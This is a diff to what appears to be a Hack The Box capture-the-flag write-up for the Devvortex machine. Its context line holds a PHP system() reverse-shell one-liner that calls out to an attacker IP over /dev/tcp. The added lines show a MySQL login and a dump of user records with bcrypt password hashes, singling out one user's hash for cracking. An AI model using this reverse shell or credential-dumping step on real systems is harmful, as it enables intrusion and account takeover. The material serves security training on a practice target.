@@ -100,6 +100,30 @@ system('bash  -c "sh -i >& /dev/tcp/10.10.16.26/9898 0>&1"');
 ![imagen](https://github.com/PolGs/HTB-Open-Beta-Season-III/assets/19478700/ced2881a-0a71-466d-b030-37355627a0af)
 ![imagen](https://github.com/PolGs/HTB-Open-Beta-Season-III/assets/19478700/0cacbe79-c0ab-485f-9ca1-989d66c66a54)
 
+Login to mysql db
+![imagen](https://github.com/PolGs/HTB-Open-Beta-Season-III/assets/19478700/a2aee3b0-9b7f-46f1-8213-c86670c1ee53)
+select from users table
+![imagen](https://github.com/PolGs/HTB-Open-Beta-Season-III/assets/19478700/66eed96c-6b82-4f7f-a81c-7c4ed1721a4a)
+we have logan's hash:
+```s
+;
++-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
+| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
++-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
+| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2023-12-02 22:15:32 | 0          | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
++-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
+
+
+-----
+
+2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
+
+
+-----
+```
+
+
 
 
 
